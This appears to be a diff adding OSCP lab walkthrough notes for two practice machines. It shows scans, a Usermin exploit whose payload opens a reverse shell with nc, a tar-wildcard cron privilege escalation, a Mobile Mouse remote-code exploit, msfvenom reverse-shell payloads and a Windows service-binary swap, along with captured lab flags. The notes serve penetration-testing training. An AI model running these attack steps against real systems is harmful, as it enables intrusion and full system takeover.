@@ -511,10 +511,247 @@ cat proof.txt
 ```
 
 #### 157
+1. Rustscan and nmap 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
+└─$ rustscan 192.168.230.157
+PORT      STATE SERVICE REASON
+21/tcp    open  ftp     syn-ack
+22/tcp    open  ssh     syn-ack
+80/tcp    open  http    syn-ack
+20000/tcp open  dnp     syn-ack
+
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
+└─$ nmap -p$(cat 157-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.230.157
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 17:45 EST
+Nmap scan report for 192.168.230.157
+Host is up (0.29s latency).
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.45.242
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0e:ad:d7:de:60:2b:49:ef:42:3b:1e:76:9c:77:33:85 (ECDSA)
+|_  256 99:b5:48:fb:77:df:18:b0:1d:ad:e0:92:f3:e1:26:0d (ED25519)
+80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+20000/tcp open  http    MiniServ 1.820 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
+|_http-server-header: MiniServ/1.820
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.47 seconds
+```
+
+2. Change hostname to oscp and found usermin portal in port 8000
+
+3. Found pdfs through ftp anonymous and used exiftool to figure out creater. Found three users - mark, cassie and robert 
+
+4. Found usermin exploit 50234 and use to get access, change exploit fiel with listener port and ip. Obtained local txt. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
+└─$ python3 50234.py -u oscp -l cassie -p cassie
+[+] Target https://oscp:20000
+[+] Login successfully
+[+] Setup GnuPG
+[+] Payload {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.242 80 >/tmp/f;echo "', 'email': '1337@webmin.com'}
+[+] Setup successful
+[+] Fetching key list
+[+] Key : idx=6\
+
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
+└─$ sudo nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.230.157] 57614
+sh: cannot set terminal process group (1017): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-5.1$ id
+id
+uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev
+```
+
+5. Found cronjob wildcard and use it for PE. Found proof.txt
+```
+cassie@oscp:/$ grep "CRON" /var/log/syslog
+grep "CRON" /var/log/syslog
+Feb 21 23:34:35 oscp CRON[1418]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
+
+cassie@oscp:/opt/admin$  echo "/bin/chmod 4755 /bin/bash" > shell.sh
+ echo "/bin/chmod 4755 /bin/bash" > shell.sh
+cassie@oscp:/opt/admin$  echo "" > "--checkpoint-action=exec=sh shell.sh"
+ echo "" > "--checkpoint-action=exec=sh shell.sh"
+cassie@oscp:/opt/admin$ echo "" > --checkpoint=1
+echo "" > --checkpoint=1
+cassie@oscp:/opt/admin$ ls
+ls
+--checkpoint-action=exec=sh shell.sh  --checkpoint=1  shell.sh
+
+cassie@oscp:/opt/admin$ /bin/bash -p
+/bin/bash -p
+bash-5.1# id
+id
+uid=1000(cassie) gid=1000(cassie) euid=0(root) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(
+bash-5.1#
+
+bash-5.1# cat proof.txt
+cat proof.txt
+689dbaf6f6eebcbbcd6a896e38224316
+```
+
+#### 155
+1. Rustscan
+```
+rustscan 192.168.230.155
+
+PORT      STATE SERVICE REASON
+80/tcp    open  http    syn-ack
+9099/tcp  open  unknown syn-ack
+9999/tcp  open  abyss   syn-ack
+35913/tcp open  unknown syn-ack
+
+```
+
+3. Nmap 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
+└─$ nmap -p$(cat 155-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.230.155
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 19:19 EST
+Nmap scan report for 192.168.230.155
+Host is up (0.30s latency).
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows
+|_http-server-header: Microsoft-IIS/10.0
+9099/tcp  open  unknown
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.0 200 OK 
+|     Server: Mobile Mouse Server 
+|     Content-Type: text/html 
+|     Content-Length: 321
+|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "OSCP" was able to receive your request.</p></BODY></HTML>
+9999/tcp  open  abyss?
+35913/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9099-TCP:V=7.94SVN%I=7%D=2/21%Time=65D6934B%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mou
+SF:se\x20Server\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x
+SF:20321\r\n\r\n<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewpor
+SF:t\"\x20content=\"width=device-width,user-scalable=no\"\x20/></HEAD><BOD
+SF:Y\x20BGCOLOR=#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sa
+SF:ns-serif;\x20text-align:center;\x20color:green;\x20font-weight:bold;\"\
+SF:x20>The\x20server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20
+SF:receive\x20your\x20request\.</p></BODY></HTML>\r\n")%r(FourOhFourReques
+SF:t,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\x20Serv
+SF:er\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x20321\r\n\
+SF:r\n<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewport\"\x20con
+SF:tent=\"width=device-width,user-scalable=no\"\x20/></HEAD><BODY\x20BGCOL
+SF:OR=#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sans-serif;\
+SF:x20text-align:center;\x20color:green;\x20font-weight:bold;\"\x20>The\x2
+SF:0server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20receive\x2
+SF:0your\x20request\.</p></BODY></HTML>\r\n");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 224.38 seconds
+```
+
+4. Found Mobile mouse RCE exploit. Download it. Worked with github one, not with exploit-db
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
+└─$ git clone https://github.com/KryoCeph/Mobile-Mouse-3.6.0.4-Exploit.git
+Cloning into 'Mobile-Mouse-3.6.0.4-Exploit'...
+remote: Enumerating objects: 18, done.
+remote: Counting objects: 100% (18/18), done.
+remote: Compressing objects: 100% (17/17), done.
+remote: Total 18 (delta 3), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (18/18), 17.48 KiB | 319.00 KiB/s, done.
+Resolving deltas: 100% (3/3), done.
+```
+
+5. Execute payloads one by one. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc/Mobile-Mouse-3.6.0.4-Exploit]
+└─$ python3 1-MMUpload.py --target 192.168.230.155 --file reverse1.exe --lhost 192.168.45.242
+Downloading shell...
+                                                                           
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc/Mobile-Mouse-3.6.0.4-Exploit]
+└─$ python3 2-MMExecute.py --target 192.168.230.155 --file reverse1.exe
+Executing Uploaded shell...
+```
+
+6. Obtained reverse shell and local.txt. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
+└─$ sudo nc -nvlp 4555
+listening on [any] 4555 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.230.155] 59665
+Microsoft Windows [Version 10.0.19045.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\Temp>
+C:\Users\Tim\Desktop>type local.txt
+type local.txt
+4e76d60c2c26455de76054bf53e772c7
+```
+
+7. Found a privileges service running. 
+```
+PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+GPGOrchestrator        Running "C:\Program Files\MilleGPG5\GPGService.exe"  
+```
+
+8. Replace service with reverse shell. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc/Mobile-Mouse-3.6.0.4-Exploit]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.242 LPORT=4448 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe
 
 
+PS C:\Program FIles\MilleGPG5> move C:\"Program Files"\MilleGPG5\GPGService.exe C:\"Program Files"\MilleGPG5\old1GPGService.exe
 
-#### 158
+```
 
+9. Stop and start service. Obtained reverse shell and proof.txt. 
+```
+PS C:\Program FIles\MilleGPG5> net start GPGOrchestrator
 
+┌──(kali㉿kali)-[~/OSCP/labs/oscpc/Mobile-Mouse-3.6.0.4-Exploit]
+└─$ sudo nc -nvlp 4448
+listening on [any] 4448 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.230.155] 59823
+Microsoft Windows [Version 10.0.19045.2251]
+(c) Microsoft Corporation. All rights reserved.
 
+C:\Windows\system32>
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+6cdf18832f9d574cbf7b948d338d4c17
+```
